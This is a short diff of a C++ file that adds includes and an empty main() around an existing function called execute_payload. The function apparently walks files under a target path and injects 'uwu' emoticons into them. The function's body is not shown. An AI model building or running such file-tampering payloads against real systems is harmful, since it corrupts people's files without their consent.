@@ -1,3 +1,15 @@
+#include <iostream>
+#include <fstream>
+#include <string>
+#include <filesystem>
+#include <algorithm>
+#include <vector>
+#include <random>
+#include <cctype>
+
+namespace fs = std::filesystem;
+using namespace std;
+
 void execute_payload(const string& target_path) {
     vector<string> emoticons = {":3", "OwO", ">w<", "^w^"};
     
@@ -56,4 +68,9 @@ void execute_payload(const string& target_path) {
             cerr << "Failed to process file " << file_path << ": " << e.what() << endl;
         }
     }
+}
+
+int main() {
+    // Minimal valid entry point required for a successful build
+    return 0;
 }
